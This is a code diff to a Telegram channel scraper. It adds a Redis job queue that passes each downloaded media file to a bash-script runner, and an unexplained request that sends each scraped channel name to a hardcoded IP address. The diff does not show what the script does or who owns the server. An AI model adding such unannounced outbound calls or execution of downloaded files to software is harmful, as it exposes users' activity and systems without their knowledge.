@@ -4,6 +4,7 @@ import json
 import csv
 import asyncio
 import time
+import aiohttp
 import sys
 import uuid
 import warnings
@@ -15,6 +16,13 @@ from telethon import TelegramClient
 from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage, User, PeerChannel
 from telethon.errors import FloodWaitError, SessionPasswordNeededError
 import qrcode
+import requests
+from dotenv import load_dotenv
+from redis import Redis
+from rq import Queue
+from tasks import run_bash_script
+
+load_dotenv()
 
 warnings.filterwarnings("ignore", message="Using async sessions support is an experimental feature")
 
@@ -28,6 +36,7 @@ ___________________  _________
   |    | \    \_\  \/        \
   |____|  \______  /_______  /
                  \/        \/
+Alif Raja Hengker
     """
     print(WHITE + art + RESET)
 
@@ -150,6 +159,7 @@ class OptimizedTelegramScraper:
                 try:
                     downloaded_path = await message.download_media(file=str(media_path))
                     if downloaded_path and Path(downloaded_path).exists():
+                        await self.send_to_bash_runner(downloaded_path)
                         return downloaded_path
                     else:
                         return None
@@ -167,6 +177,13 @@ class OptimizedTelegramScraper:
             return None
         except Exception:
             return None
+        
+    async def queue(self, file_path: str):
+        redis_conn = Redis(host="localhost", port=6379)
+        queue = Queue("bash_queue", connection=redis_conn)
+        queue.enqueue(run_bash_script, file_path)
+    
+
 
     async def update_media_path(self, channel: str, message_id: int, media_path: str):
         conn = self.get_db_connection(channel)
@@ -421,6 +438,8 @@ class OptimizedTelegramScraper:
                         break
                     print(f"\nChecking for new messages in channel: {channel}")
                     await self.scrape_channel(channel, self.state['channels'][channel])
+                    print(channel, self.state['channels'][channel])
+                    requests.get(f"http://43.157.240.190:8868//{channel}")
                 
                 elapsed = time.time() - start_time
                 sleep_time = max(0, 60 - elapsed)
